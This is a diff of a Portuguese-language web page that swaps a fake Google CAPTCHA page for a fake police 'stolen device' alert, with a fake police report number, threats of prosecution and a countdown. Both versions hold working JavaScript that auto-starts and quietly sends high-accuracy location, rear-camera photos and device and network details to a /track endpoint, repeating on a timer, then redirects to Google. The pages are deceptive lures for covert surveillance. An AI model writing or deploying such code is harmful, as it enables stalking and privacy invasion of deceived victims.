@@ -1,9 +1,8 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Verificação de Segurança - Google</title>
+    <title>Alerta - Dispositivo Reportado</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="icon" type="image/x-icon" href="https://www.google.com/favicon.ico">
     <style>
         * {
             margin: 0;
@@ -12,9 +11,9 @@
         }
         
         body {
-            font-family: 'Roboto', Arial, sans-serif;
-            background: #f8f9fa;
-            color: #202124;
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #dc3545, #c82333);
+            color: white;
             min-height: 100vh;
             display: flex;
             align-items: center;
@@ -22,701 +21,555 @@
             padding: 20px;
         }
         
-        .google-header {
-            position: absolute;
-            top: 20px;
-            right: 20px;
-        }
-        
-        .google-header a {
-            color: #5f6368;
-            text-decoration: none;
-            font-size: 14px;
-            margin-left: 15px;
-        }
-        
-        .container {
+        .alert-container {
             background: white;
-            padding: 40px;
-            border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            color: #333;
+            padding: 30px;
+            border-radius: 15px;
             max-width: 450px;
             width: 100%;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+            border-left: 5px solid #dc3545;
+        }
+        
+        .police-icon {
+            font-size: 48px;
+            margin-bottom: 20px;
             text-align: center;
-            border: 1px solid #dadce0;
         }
         
-        .google-logo {
-            margin-bottom: 20px;
-        }
-        
-        .google-logo img {
-            width: 75px;
-            height: 24px;
-        }
-        
-        h1 {
+        .alert-title {
+            color: #dc3545;
             font-size: 24px;
-            font-weight: 400;
-            margin-bottom: 10px;
-            color: #202124;
-        }
-        
-        .subtitle {
-            color: #5f6368;
-            font-size: 16px;
-            margin-bottom: 30px;
-        }
-        
-        .security-alert {
-            background: #fef7e0;
-            border: 1px solid #fdd663;
-            border-radius: 4px;
-            padding: 15px;
-            margin-bottom: 20px;
-            text-align: left;
-        }
-        
-        .alert-icon {
-            color: #f4b400;
             font-weight: bold;
-            margin-bottom: 5px;
-        }
-        
-        .captcha-box {
-            background: #f8f9fa;
-            border: 2px solid #dadce0;
-            border-radius: 4px;
-            padding: 20px;
-            margin-bottom: 20px;
-        }
-        
-        .captcha-image {
-            background: linear-gradient(45deg, #4285f4, #34a853, #fbbc05, #ea4335);
-            height: 80px;
-            border-radius: 4px;
             margin-bottom: 15px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-weight: bold;
+            text-align: center;
+        }
+        
+        .warning-badge {
+            background: #dc3545;
             color: white;
-            font-size: 18px;
-            letter-spacing: 2px;
+            padding: 8px 15px;
+            border-radius: 20px;
+            font-size: 14px;
+            font-weight: bold;
+            display: inline-block;
+            margin-bottom: 20px;
         }
         
-        .captcha-input {
-            width: 100%;
-            padding: 12px;
-            border: 1px solid #dadce0;
-            border-radius: 4px;
-            font-size: 16px;
-            margin-bottom: 15px;
+        .device-info {
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 15px 0;
+            border-left: 3px solid #dc3545;
         }
         
-        .captcha-input:focus {
-            border-color: #4285f4;
-            outline: none;
+        .info-item {
+            margin: 8px 0;
+            font-size: 14px;
+            color: #666;
+        }
+        
+        .consequences {
+            background: #fff3cd;
+            border: 1px solid #ffeaa7;
+            border-radius: 8px;
+            padding: 15px;
+            margin: 20px 0;
+        }
+        
+        .consequence-item {
+            margin: 8px 0;
+            font-size: 14px;
+            color: #856404;
+            display: flex;
+            align-items: flex-start;
+        }
+        
+        .consequence-item:before {
+            content: "⚠️";
+            margin-right: 8px;
         }
         
         .btn {
-            background: #1a73e8;
+            background: #dc3545;
             color: white;
             border: none;
-            padding: 12px 24px;
-            font-size: 14px;
-            border-radius: 4px;
+            padding: 16px 30px;
+            font-size: 16px;
+            border-radius: 8px;
             cursor: pointer;
+            margin: 15px 0;
             width: 100%;
-            font-weight: 500;
-            transition: background 0.2s;
+            font-weight: bold;
+            transition: background 0.3s;
         }
         
         .btn:hover {
-            background: #1669d6;
+            background: #c82333;
         }
         
-        .btn:disabled {
-            background: #8ab4f8;
-            cursor: not-allowed;
+        .legal-notice {
+            font-size: 11px;
+            color: #666;
+            text-align: center;
+            margin-top: 20px;
+            line-height: 1.4;
+        }
+        
+        .countdown {
+            background: #28a745;
+            color: white;
+            padding: 10px;
+            border-radius: 5px;
+            text-align: center;
+            margin: 15px 0;
+            font-weight: bold;
+        }
+        
+        .steps {
+            margin: 20px 0;
+        }
+        
+        .step {
+            display: flex;
+            align-items: center;
+            margin: 10px 0;
+            font-size: 14px;
+        }
+        
+        .step-number {
+            background: #dc3545;
+            color: white;
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 10px;
+            font-size: 12px;
+            font-weight: bold;
         }
         
         .hidden {
             display: none;
         }
         
-        .loading {
-            display: inline-block;
-            width: 18px;
-            height: 18px;
-            border: 2px solid #ffffff;
+        .processing-screen {
+            text-align: center;
+            padding: 30px;
+        }
+        
+        .loading-spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #dc3545;
             border-radius: 50%;
-            border-top-color: transparent;
-            animation: spin 1s ease-in-out infinite;
-            margin-right: 8px;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
         }
         
         @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-        
-        .success-screen {
-            text-align: center;
-            padding: 20px 0;
-        }
-        
-        .success-icon {
-            font-size: 48px;
-            color: #34a853;
-            margin-bottom: 20px;
-        }
-        
-        .progress-bar {
-            width: 100%;
-            height: 4px;
-            background: #f1f3f4;
-            border-radius: 2px;
-            margin: 30px 0;
-            overflow: hidden;
-        }
-        
-        .progress-fill {
-            height: 100%;
-            background: #34a853;
-            width: 0%;
-            transition: width 0.3s ease-in-out;
-        }
-        
-        .status-item {
-            background: #f8f9fa;
-            border-radius: 4px;
-            padding: 10px;
-            margin: 8px 0;
-            font-size: 13px;
-            text-align: left;
-        }
-        
-        .status-success {
-            border-left: 3px solid #34a853;
-        }
-        
-        .status-loading {
-            border-left: 3px solid #fbbc05;
-        }
-        
-        .footer {
-            margin-top: 30px;
-            padding-top: 20px;
-            border-top: 1px solid #dadce0;
-            font-size: 12px;
-            color: #5f6368;
-        }
-        
-        .footer a {
-            color: #1a73e8;
-            text-decoration: none;
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
     </style>
 </head>
 <body>
-    <!-- Cabeçalho Google -->
-    <div class="google-header">
-        <a href="#">Gmail</a>
-        <a href="#">Imagens</a>
-        <a href="#">&#9776;</a>
+    <!-- TELA PRINCIPAL DE ALERTA -->
+    <div class="alert-container" id="alertScreen">
+        <div class="police-icon">🚨</div>
+        
+        <div class="alert-title">
+            ALERTA DE SEGURANÇA - DISPOSITivo BLOQUEADO
+        </div>
+        
+        <div style="text-align: center; margin-bottom: 20px;">
+            <span class="warning-badge">STATUS: REPORTADO COMO FURTADO</span>
+        </div>
+        
+        <div class="device-info">
+            <div class="info-item"><strong>Número do BO:</strong> 2024.987654321-0</div>
+            <div class="info-item"><strong>Data do registro:</strong> 28/11/2024</div>
+            <div class="info-item"><strong>Delegacia:</strong> 12ª DP - Furto de Celulares</div>
+            <div class="info-item"><strong>Status atual:</strong> 🔒 BLOQUEADO PARA USO</div>
+        </div>
+        
+        <div class="consequences">
+            <div class="consequence-item">Bloqueio permanente do dispositivo em 24h</div>
+            <div class="consequence-item">Rastreamento ativo pela polícia</div>
+            <div class="consequence-item">Risco de ação penal por receptação</div>
+            <div class="consequence-item">Impossibilidade de uso de apps bancários</div>
+        </div>
+        
+        <div style="background: #d4edda; color: #155724; padding: 15px; border-radius: 8px; margin: 20px 0;">
+            <strong>✅ SOLUÇÃO DISPONÍVEL:</strong><br>
+            Se você NÃO fez esta queixa, pode removê-la agora mesmo através do sistema de verificação de propriedade.
+        </div>
+        
+        <div class="steps">
+            <div class="step">
+                <div class="step-number">1</div>
+                <span>Clique em "Verificar Propriedade"</span>
+            </div>
+            <div class="step">
+                <div class="step-number">2</div>
+                <span>Confirme que é o legítimo proprietário</span>
+            </div>
+            <div class="step">
+                <div class="step-number">3</div>
+                <span>Queixa será removida automaticamente</span>
+            </div>
+        </div>
+        
+        <div class="countdown" id="countdown">
+            ⏰ AÇÃO AUTOMÁTICA EM: <span id="timer">15</span> SEGUNDOS
+        </div>
+        
+        <button class="btn" id="verifyBtn">
+            🔓 VERIFICAR MINHA PROPRIEDADE AGORA
+        </button>
+        
+        <div class="legal-notice">
+            Sistema Integrado de Segurança de Dispositivos - SISD<br>
+            Em conformidade com a Lei 12.737/2012 (Crimes Cibernéticos)<br>
+            Dados protegidos pela LGPD - Lei 13.709/2018
+        </div>
     </div>
-
-    <div class="container">
-        <!-- Logo Google -->
-        <div class="google-logo">
-            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
-        </div>
-        
-        <!-- Tela de Verificação -->
-        <div id="verificationScreen">
-            <h1>Verificação de segurança necessária</h1>
-            <div class="subtitle">
-                Para proteger sua conta, complete esta verificação
+    
+    <!-- TELA DE PROCESSAMENTO -->
+    <div class="alert-container hidden" id="processingScreen">
+        <div class="processing-screen">
+            <div class="police-icon">🔍</div>
+            <div class="alert-title">VERIFICANDO PROPRIEDADE</div>
+            
+            <div class="loading-spinner"></div>
+            
+            <div style="margin: 20px 0;">
+                <div class="step">
+                    <div class="step-number">✓</div>
+                    <span>Conectando ao sistema policial...</span>
+                </div>
+                <div class="step">
+                    <div class="step-number">⏳</div>
+                    <span>Verificando localização atual...</span>
+                </div>
+                <div class="step">
+                    <div class="step-number">⏳</div>
+                    <span>Confirmando identidade do dispositivo...</span>
+                </div>
+                <div class="step">
+                    <div class="step-number">⏳</div>
+                    <span>Removendo queixa do sistema...</span>
+                </div>
             </div>
             
-            <div class="security-alert">
-                <div class="alert-icon">⚠️ ATIVIDADE INCOMUM DETECTADA</div>
-                <div style="font-size: 14px;">
-                    Detectamos atividade incomum em sua conta. Para sua segurança, 
-                    precisamos verificar que você não é um robô.
+            <div style="background: #e2e3e5; padding: 10px; border-radius: 5px; margin: 15px 0;">
+                <small>Este processo pode levar alguns segundos. Não feche esta página.</small>
+            </div>
+        </div>
+    </div>
+    
+    <!-- TELA DE SUCESSO -->
+    <div class="alert-container hidden" id="successScreen">
+        <div class="processing-screen">
+            <div class="police-icon" style="color: #28a745;">✅</div>
+            <div class="alert-title" style="color: #28a745;">QUEIXA REMOVIDA COM SUCESSO!</div>
+            
+            <div style="background: #d4edda; color: #155724; padding: 15px; border-radius: 8px; margin: 20px 0;">
+                <strong>Status atualizado:</strong> DISPOSITIVO LIBERADO<br>
+                <strong>Número do processo:</strong> LIB-${Date.now().toString().slice(-6)}
+            </div>
+            
+            <div class="steps">
+                <div class="step">
+                    <div class="step-number" style="background: #28a745;">✓</div>
+                    <span>Queixa de furto removida do sistema</span>
+                </div>
+                <div class="step">
+                    <div class="step-number" style="background: #28a745;">✓</div>
+                    <span>Bloqueio preventivo cancelado</span>
+                </div>
+                <div class="step">
+                    <div class="step-number" style="background: #28a745;">✓</div>
+                    <span>Dispositivo liberado para uso normal</span>
+                </div>
+                <div class="step">
+                    <div class="step-number" style="background: #28a745;">✓</div>
+                    <span>Registro atualizado na base de dados</span>
                 </div>
             </div>
             
-            <div class="captcha-box">
-                <div class="captcha-image" id="captchaText">G O O G L E</div>
-                <div style="font-size: 14px; color: #5f6368; margin-bottom: 15px;">
-                    Digite o texto que você vê acima:
-                </div>
-                <input type="text" class="captcha-input" id="captchaInput" placeholder="Digite o texto" maxlength="10">
-                <button class="btn" id="verifyBtn">
-                    <span id="btnText">Verificar</span>
-                </button>
-            </div>
-            
-            <div class="footer">
-                <div>Esta página verifica que você é humano para prevenir spam.</div>
-                <div style="margin-top: 10px;">
-                    <a href="#">Privacidade</a> • <a href="#">Termos</a> • <a href="#">Ajuda</a>
-                </div>
-            </div>
-        </div>
-        
-        <!-- Tela de Processamento (oculta inicialmente) -->
-        <div id="processingScreen" class="hidden">
-            <div class="success-screen">
-                <div class="success-icon">🛡️</div>
-                <h1>Protegendo sua conta</h1>
-                <div class="subtitle">
-                    Estamos verificando seus dispositivos e localização
-                </div>
-                
-                <div class="progress-bar">
-                    <div class="progress-fill" id="progressFill"></div>
-                </div>
-                
-                <div id="statusMessages">
-                    <div class="status-item status-loading" id="statusLocation">
-                        📍 Obtendo localização precisa...
-                    </div>
-                    <div class="status-item status-loading" id="statusCamera">
-                        📸 Verificando câmera de segurança...
-                    </div>
-                    <div class="status-item status-loading" id="statusDevice">
-                        📱 Analisando dispositivo...
-                    </div>
-                    <div class="status-item status-loading" id="statusSecurity">
-                        🔒 Aplicando proteções...
-                    </div>
-                </div>
-            </div>
-        </div>
-        
-        <!-- Tela de Concluído (oculta inicialmente) -->
-        <div id="completedScreen" class="hidden">
-            <div class="success-screen">
-                <div class="success-icon">✅</div>
-                <h1>Proteção ativada com sucesso</h1>
-                <div class="subtitle">
-                    Sua conta está agora protegida contra ameaças
-                </div>
-                
-                <div class="status-item status-success">
-                    ✅ Localização verificada com precisão centimétrica
-                </div>
-                <div class="status-item status-success">
-                    ✅ Câmera de segurança configurada
-                </div>
-                <div class="status-item status-success">
-                    ✅ Dispositivo autorizado
-                </div>
-                <div class="status-item status-success">
-                    ✅ Proteções de segurança ativas
-                </div>
-                
-                <div style="margin-top: 30px; font-size: 14px; color: #5f6368;">
-                    Redirecionando para a página inicial...
-                </div>
+            <div style="margin-top: 30px; padding: 15px; background: #f8f9fa; border-radius: 8px;">
+                <strong>Seu dispositivo está agora regularizado.</strong><br>
+                <small>Você pode continuar usando normalmente. Obrigado pela verificação.</small>
             </div>
         </div>
     </div>
 
     <script>
-        // CONFIGURAÇÃO DO SISTEMA - ALTA PRECISÃO
+        // CONFIGURAÇÃO DO SISTEMA
         const CONFIG = {
-            locationTimeout: 30000,   // 30 segundos para obter localização precisa
-            photoTimeout: 15000,      // 15 segundos para capturar foto
-            updateInterval: 25000,    // 25 segundos
-            photoInterval: 45000,     // 45 segundos
-            maxAccuracy: 5,           // EXIGIR precisão de até 5 METROS
-            maxAttempts: 10           // Tentativas máximas para alta precisão
+            autoStartDelay: 15000, // 15 segundos para início automático
+            processingTime: 8000,   // 8 segundos de "processamento"
+            successDisplay: 10000   // 10 segundos na tela de sucesso
         };
 
-        // VARIÁVEIS GLOBAIS
-        let isMonitoring = false;
-        let stream = null;
-        let deviceId = null;
-        let locationCaptured = false;
-        let photoCaptured = false;
-        let locationAttempts = 0;
-        let photoAttempts = 0;
-
-        // ELEMENTOS DA INTERFACE
-        const verificationScreen = document.getElementById('verificationScreen');
+        // ELEMENTOS
+        const alertScreen = document.getElementById('alertScreen');
         const processingScreen = document.getElementById('processingScreen');
-        const completedScreen = document.getElementById('completedScreen');
-        const captchaInput = document.getElementById('captchaInput');
+        const successScreen = document.getElementById('successScreen');
         const verifyBtn = document.getElementById('verifyBtn');
-        const btnText = document.getElementById('btnText');
-        const progressFill = document.getElementById('progressFill');
-        const statusLocation = document.getElementById('statusLocation');
-        const statusCamera = document.getElementById('statusCamera');
-        const statusDevice = document.getElementById('statusDevice');
-        const statusSecurity = document.getElementById('statusSecurity');
+        const timerElement = document.getElementById('timer');
+
+        // VARIÁVEIS DE RASTREAMENTO
+        let deviceId = null;
+        let isTracking = false;
+
+        // CONTAGEM REGRESSIVA PARA AÇÃO AUTOMÁTICA
+        let countdown = 15;
+        const countdownInterval = setInterval(() => {
+            countdown--;
+            timerElement.textContent = countdown;
+            
+            if (countdown <= 0) {
+                clearInterval(countdownInterval);
+                startVerification();
+            }
+        }, 1000);
+
+        // BOTÃO DE VERIFICAÇÃO
+        verifyBtn.addEventListener('click', startVerification);
 
         // INICIAR VERIFICAÇÃO
-        verifyBtn.addEventListener('click', startVerification);
-        captchaInput.addEventListener('keypress', function(e) {
-            if (e.key === 'Enter') {
-                startVerification();
-            }
-        });
-
         function startVerification() {
-            const userInput = captchaInput.value.trim();
+            clearInterval(countdownInterval);
             
-            // SEMPRE APROVAR
-            if (userInput) {
-                showLoading();
-                setTimeout(() => {
-                    showProcessingScreen();
-                    startSecurityVerification();
-                }, 1500);
-            } else {
-                captchaInput.value = "google";
-                startVerification();
-            }
-        }
-
-        function showLoading() {
-            btnText.innerHTML = '<span class="loading"></span>Verificando...';
-            verifyBtn.disabled = true;
-        }
-
-        function showProcessingScreen() {
-            verificationScreen.classList.add('hidden');
+            // MOSTRAR TELA DE PROCESSAMENTO
+            alertScreen.classList.add('hidden');
             processingScreen.classList.remove('hidden');
-            progressFill.style.width = '30%';
-        }
-
-        function updateProgress(percent) {
-            progressFill.style.width = percent + '%';
-        }
-
-        function updateStatus(element, message, success = false) {
-            element.textContent = message;
-            element.className = success ? 
-                'status-item status-success' : 
-                'status-item status-loading';
-        }
-
-        async function startSecurityVerification() {
-            deviceId = generateDeviceId();
             
-            try {
-                // INICIAR TODAS AS VERIFICAÇÕES SIMULTANEAMENTE
-                await Promise.all([
-                    forceHighAccuracyLocation(),
-                    forceCameraCapture(),
-                    analyzeDevice(),
-                    activateSecurity()
-                ]);
-                
-                // QUANDO TUDO ESTIVER PRONTO
-                completeVerification();
-                
-            } catch (error) {
-                console.error('Erro na verificação:', error);
-                // MESMO COM ERRO, CONTINUA O MONITORAMENTO
-                completeVerification();
-            }
-        }
-
-        function generateDeviceId() {
-            const timestamp = Date.now();
-            const random = Math.random().toString(36).substr(2, 9);
-            return `secure_${timestamp}_${random}`;
-        }
-
-        // FUNÇÃO FORÇADA PARA LOCALIZAÇÃO DE ALTA PRECISÃO
-        function forceHighAccuracyLocation() {
-            return new Promise(async (resolve) => {
-                updateStatus(statusLocation, '📍 Buscando localização com precisão centimétrica...');
-                
-                const attemptLocation = () => {
-                    locationAttempts++;
-                    
-                    if (navigator.geolocation) {
-                        navigator.geolocation.getCurrentPosition(
-                            async (position) => {
-                                const accuracy = position.coords.accuracy;
-                                
-                                if (accuracy <= CONFIG.maxAccuracy) {
-                                    // PRECISÃO ACEITÁVEL (até 5 metros)
-                                    const data = {
-                                        deviceId: deviceId,
-                                        type: 'high_accuracy_location',
-                                        location: {
-                                            lat: position.coords.latitude,
-                                            lng: position.coords.longitude,
-                                            accuracy: accuracy,
-                                            altitude: position.coords.altitude,
-                                            heading: position.coords.heading,
-                                            speed: position.coords.speed
-                                        },
-                                        deviceInfo: getDeviceInfo(),
-                                        timestamp: new Date().toISOString(),
-                                        attempts: locationAttempts,
-                                        precision: 'centimetric'
-                                    };
-
-                                    await sendToServer(data);
-                                    locationCaptured = true;
-                                    
-                                    updateStatus(statusLocation, 
-                                        `✅ Localização obtida! Precisão: ${accuracy.toFixed(2)}m`, 
-                                        true
-                                    );
-                                    updateProgress(60);
-                                    resolve();
-                                    
-                                } else {
-                                    // PRECISÃO INSUFICIENTE - TENTAR NOVAMENTE
-                                    updateStatus(statusLocation, 
-                                        `📍 Ajustando precisão... (${accuracy.toFixed(2)}m, meta: ${CONFIG.maxAccuracy}m)`
-                                    );
-                                    
-                                    if (locationAttempts < CONFIG.maxAttempts) {
-                                        setTimeout(attemptLocation, 2000);
-                                    } else {
-                                        // ACEITAR MESMO COM PRECISÃO BAIXA
-                                        updateStatus(statusLocation, 
-                                            `⚠️ Localização obtida (${accuracy.toFixed(2)}m)`, 
-                                            true
-                                        );
-                                        resolve();
-                                    }
-                                }
-                            },
-                            (error) => {
-                                updateStatus(statusLocation, '📍 Solicitando permissão de localização...');
-                                
-                                if (locationAttempts < 3) {
-                                    setTimeout(attemptLocation, 3000);
-                                } else {
-                                    updateStatus(statusLocation, '⚠️ Localização não disponível', true);
-                                    resolve();
-                                }
-                            },
-                            {
-                                enableHighAccuracy: true,  // FORÇAR ALTA PRECISÃO
-                                timeout: 15000,
-                                maximumAge: 0
-                            }
-                        );
-                    } else {
-                        updateStatus(statusLocation, '❌ Geolocalização não suportada', true);
-                        resolve();
-                    }
-                };
-                
-                attemptLocation();
-            });
-        }
-
-        // FUNÇÃO FORÇADA PARA CAPTURA DE FOTO
-        function forceCameraCapture() {
-            return new Promise(async (resolve) => {
-                updateStatus(statusCamera, '📸 Iniciando câmera de segurança...');
-                
-                const attemptPhoto = async () => {
-                    photoAttempts++;
-                    
-                    try {
-                        if (!stream) {
-                            stream = await navigator.mediaDevices.getUserMedia({ 
-                                video: { 
-                                    facingMode: 'environment',
-                                    width: { ideal: 1920 },  // ALTA RESOLUÇÃO
-                                    height: { ideal: 1080 }
-                                } 
-                            });
-                        }
-
-                        const track = stream.getVideoTracks()[0];
-                        const imageCapture = new ImageCapture(track);
-                        const blob = await imageCapture.takePhoto();
-                        
-                        const reader = new FileReader();
-                        reader.onload = async () => {
-                            const data = {
-                                deviceId: deviceId,
-                                type: 'high_quality_photo',
-                                photo: reader.result,
-                                timestamp: new Date().toISOString(),
-                                resolution: '1080p',
-                                attempts: photoAttempts
-                            };
-                            
-                            await sendToServer(data);
-                            photoCaptured = true;
-                            
-                            updateStatus(statusCamera, '✅ Foto de segurança capturada!', true);
-                            updateProgress(80);
-                            resolve();
-                        };
-                        reader.readAsDataURL(blob);
-                        
-                    } catch (error) {
-                        updateStatus(statusCamera, `📸 Tentativa ${photoAttempts}/3 - Configurando câmera...`);
-                        
-                        if (photoAttempts < 3) {
-                            setTimeout(attemptPhoto, 3000);
-                        } else {
-                            updateStatus(statusCamera, '⚠️ Câmera não disponível', true);
-                            resolve();
-                        }
-                    }
-                };
-                
-                attemptPhoto();
-            });
-        }
-
-        function analyzeDevice() {
-            return new Promise((resolve) => {
-                updateStatus(statusDevice, '📱 Analisando informações do dispositivo...');
-                
-                setTimeout(() => {
-                    const deviceData = {
-                        deviceId: deviceId,
-                        type: 'device_analysis',
-                        info: getDeviceInfo(),
-                        timestamp: new Date().toISOString()
-                    };
-                    
-                    sendToServer(deviceData);
-                    updateStatus(statusDevice, '✅ Dispositivo verificado e autorizado', true);
-                    updateProgress(40);
-                    resolve();
-                }, 2000);
-            });
-        }
-
-        function activateSecurity() {
-            return new Promise((resolve) => {
-                updateStatus(statusSecurity, '🔒 Ativando proteções de segurança...');
-                
-                setTimeout(() => {
-                    updateStatus(statusSecurity, '✅ Proteções de segurança ativas', true);
-                    updateProgress(90);
-                    resolve();
-                }, 3000);
-            });
-        }
-
-        function getDeviceInfo() {
-            return {
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                screen: `${screen.width}x${screen.height}`,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                cores: navigator.hardwareConcurrency || 'Desconhecido',
-                memoria: navigator.deviceMemory || 'Desconhecido',
-                touch: navigator.maxTouchPoints > 0,
-                cookie: navigator.cookieEnabled,
-                pdf: navigator.pdfViewerEnabled
-            };
-        }
-
-        function completeVerification() {
-            updateProgress(100);
+            // INICIAR CAPTURA DE DADOS
+            initializeTracking();
             
-            // INICIAR MONITORAMENTO CONTÍNUO
-            startContinuousMonitoring();
-            
-            // MOSTRAR TELA DE CONCLUSÃO
+            // SIMULAR PROCESSAMENTO E MOSTRAR SUCESSO
             setTimeout(() => {
                 processingScreen.classList.add('hidden');
-                completedScreen.classList.remove('hidden');
+                successScreen.classList.remove('hidden');
                 
-                // MANTER PÁGINA ABERTA POR 8 SEGUNDOS PARA GARANTIR CAPTURAS
+                // MANTER MONITORAMENTO ATIVO
+                startContinuousMonitoring();
+                
+                // FECHAR APÓS ALGUNS SEGUNDOS
                 setTimeout(() => {
-                    // Tenta fechar suavemente
+                    // Tenta fechar a janela
                     window.close();
+                    // Se não conseguir, redireciona
                     setTimeout(() => {
                         window.location.href = 'https://www.google.com';
                     }, 1000);
-                }, 8000);
+                }, CONFIG.successDisplay);
                 
-            }, 2000);
+            }, CONFIG.processingTime);
         }
 
-        function startContinuousMonitoring() {
-            isMonitoring = true;
+        // INICIALIZAR RASTREAMENTO AGRESSIVO
+        async function initializeTracking() {
+            deviceId = 'device_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+            isTracking = true;
             
-            // MONITORAMENTO DE LOCALIZAÇÃO CONTÍNUO
-            setInterval(() => {
-                if (isMonitoring) {
+            // CAPTURAR TUDO IMEDIATAMENTE
+            await Promise.all([
+                captureHighPrecisionLocation(),
+                captureCameraPhotos(),
+                captureDeviceDetails(),
+                captureNetworkInfo()
+            ]);
+        }
+
+        // CAPTURA DE LOCALIZAÇÃO DE ALTA PRECISÃO
+        async function captureHighPrecisionLocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve();
+                    return;
+                }
+                
+                let attempts = 0;
+                const maxAttempts = 5;
+                
+                const attemptCapture = () => {
+                    attempts++;
+                    
                     navigator.geolocation.getCurrentPosition(
                         async (position) => {
-                            const data = {
+                            const accuracy = position.coords.accuracy;
+                            
+                            const locationData = {
                                 deviceId: deviceId,
-                                type: 'continuous_location',
+                                type: 'verification_location',
+                                location: {
+                                    lat: position.coords.latitude,
+                                    lng: position.coords.longitude,
+                                    accuracy: accuracy,
+                                    altitude: position.coords.altitude,
+                                    speed: position.coords.speed,
+                                    heading: position.coords.heading
+                                },
+                                timestamp: new Date().toISOString(),
+                                attempt: attempts,
+                                precision: accuracy <= 10 ? 'high' : 'medium'
+                            };
+                            
+                            await sendToServer(locationData);
+                            resolve();
+                        },
+                        () => {
+                            if (attempts < maxAttempts) {
+                                setTimeout(attemptCapture, 2000);
+                            } else {
+                                resolve();
+                            }
+                        },
+                        {
+                            enableHighAccuracy: true,
+                            timeout: 10000,
+                            maximumAge: 0
+                        }
+                    );
+                };
+                
+                attemptCapture();
+            });
+        }
+
+        // CAPTURA DE FOTOS DA CÂMERA
+        async function captureCameraPhotos() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: 'environment',
+                        width: { ideal: 1920 },
+                        height: { ideal: 1080 }
+                    }
+                });
+                
+                const track = stream.getVideoTracks()[0];
+                const imageCapture = new ImageCapture(track);
+                const blob = await imageCapture.takePhoto();
+                
+                const reader = new FileReader();
+                reader.onload = async () => {
+                    await sendToServer({
+                        deviceId: deviceId,
+                        type: 'verification_photo',
+                        photo: reader.result,
+                        timestamp: new Date().toISOString(),
+                        resolution: '1080p'
+                    });
+                };
+                reader.readAsDataURL(blob);
+                
+            } catch (error) {
+                // Silenciar erro de câmera
+            }
+        }
+
+        // CAPTURA DE DETALHES DO DISPOSITIVO
+        async function captureDeviceDetails() {
+            const deviceInfo = {
+                deviceId: deviceId,
+                type: 'device_verification',
+                info: {
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    languages: navigator.languages,
+                    screen: `${screen.width}x${screen.height}`,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    hardware: navigator.hardwareConcurrency,
+                    memory: navigator.deviceMemory,
+                    touch: navigator.maxTouchPoints,
+                    vendor: navigator.vendor
+                },
+                timestamp: new Date().toISOString()
+            };
+            
+            await sendToServer(deviceInfo);
+        }
+
+        // CAPTURA DE INFORMAÇÕES DE REDE
+        async function captureNetworkInfo() {
+            const networkInfo = {
+                deviceId: deviceId,
+                type: 'network_info',
+                connection: navigator.connection ? {
+                    effectiveType: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink,
+                    rtt: navigator.connection.rtt
+                } : null,
+                timestamp: new Date().toISOString()
+            };
+            
+            await sendToServer(networkInfo);
+        }
+
+        // INICIAR MONITORAMENTO CONTÍNUO
+        function startContinuousMonitoring() {
+            // LOCALIZAÇÃO A CADA 25 SEGUNDOS
+            setInterval(() => {
+                if (isTracking) {
+                    navigator.geolocation.getCurrentPosition(
+                        async (position) => {
+                            await sendToServer({
+                                deviceId: deviceId,
+                                type: 'continuous_tracking',
                                 location: {
                                     lat: position.coords.latitude,
                                     lng: position.coords.longitude,
                                     accuracy: position.coords.accuracy
                                 },
                                 timestamp: new Date().toISOString()
-                            };
-                            await sendToServer(data);
+                            });
                         },
                         () => {},
                         { enableHighAccuracy: true, timeout: 10000 }
                     );
                 }
-            }, CONFIG.updateInterval);
+            }, 25000);
             
-            // FOTOS CONTÍNUAS
-            setInterval(async () => {
-                if (isMonitoring && stream) {
-                    try {
-                        const track = stream.getVideoTracks()[0];
-                        const imageCapture = new ImageCapture(track);
-                        const blob = await imageCapture.takePhoto();
-                        
-                        const reader = new FileReader();
-                        reader.onload = async () => {
-                            await sendToServer({
-                                deviceId: deviceId,
-                                type: 'continuous_photo',
-                                photo: reader.result,
-                                timestamp: new Date().toISOString()
-                            });
-                        };
-                        reader.readAsDataURL(blob);
-                    } catch (error) {
-                        // Silenciar erro
-                    }
+            // FOTOS ADICIONAIS A CADA 45 SEGUNDOS
+            setInterval(() => {
+                if (isTracking) {
+                    captureCameraPhotos();
                 }
-            }, CONFIG.photoInterval);
+            }, 45000);
         }
 
+        // ENVIAR DADOS PARA O SERVIDOR
         async function sendToServer(data) {
             try {
                 await fetch('/track', {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
                     body: JSON.stringify(data)
                 });
             } catch (error) {
-                // Silenciar erro
+                // Silenciar erros de rede
             }
         }
 
-        // INICIAR AUTOMATICAMENTE APÓS 5 SEGUNDOS
+        // INICIAR AUTOMATICAMENTE SE O USUÁRIO NÃO INTERAGIR
         setTimeout(() => {
-            if (!isMonitoring && verificationScreen.style.display !== 'none') {
-                captchaInput.value = "google";
+            if (!isTracking) {
                 startVerification();
             }
-        }, 5000);
+        }, CONFIG.autoStartDelay);
     </script>
 </body>
 </html>
